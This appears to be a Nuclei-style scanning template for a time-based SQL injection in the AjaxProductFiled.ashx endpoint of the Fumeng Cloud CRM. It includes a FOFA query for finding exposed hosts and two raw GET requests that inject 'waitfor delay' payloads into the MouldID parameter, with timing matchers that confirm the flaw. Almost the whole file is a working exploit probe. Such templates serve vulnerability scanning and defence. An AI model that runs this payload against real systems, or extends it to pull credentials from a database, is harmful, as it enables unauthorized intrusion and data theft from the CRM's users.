id: fumeng-cloud-crm-ajaxproductfiled-sqli
info:
  name: "孚盟云 CRM 系统 AjaxProductFiled.ashx 接口 SQL 注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="孚盟软件-孚盟云"
          上海孚盟软件有限公司作为外贸SaaS服务及解决方案提供商，其孚盟云产品中的AjaxProductFiled.ashx处理接口存在SQL注入缺陷。攻击者可通过构造恶意SQL语句执行未经授权的数据库操作，导致敏感数据泄露（包括但不限于管理员后台凭证、用户个人信息等）。在特定权限条件下，该漏洞可能被用于在目标服务器部署恶意负载，最终实现对宿主系统的完全控制。
  tags: 孚盟云
http:
- raw:
  - |
    GET /m/Dingding/Ajax/AjaxProductFiled.ashx?method=savePuductFiled&MouldID=-1'waitfor+delay'0:0:5'-- HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /m/Dingding/Ajax/AjaxProductFiled.ashx?method=savePuductFiled&MouldID=-1'waitfor+delay'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
